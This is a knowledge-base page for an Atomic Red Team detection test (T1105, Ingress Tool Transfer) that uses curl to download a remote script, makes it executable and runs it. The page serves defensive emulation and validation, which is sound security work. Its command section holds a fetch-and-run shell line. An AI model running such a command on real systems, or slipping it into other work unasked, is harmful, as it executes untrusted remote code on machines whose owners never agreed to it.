---
atomic_guid: "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3"
title: "Linux Download File and Run"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-27 19:12:27"
executor: "sh"
aliases:
  - "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3"
  - "Linux Download File and Run"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Utilize linux Curl to download a remote file, chmod +x it and run it.

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Input Arguments

### payload_name

- description: payload name
- type: string
- default: atomic.sh

### remote_url

- description: url of remote payload
- type: string
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh

## Executor

- name: sh

### Command

```bash
curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
```

### Cleanup

```bash
rm #{payload_name}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
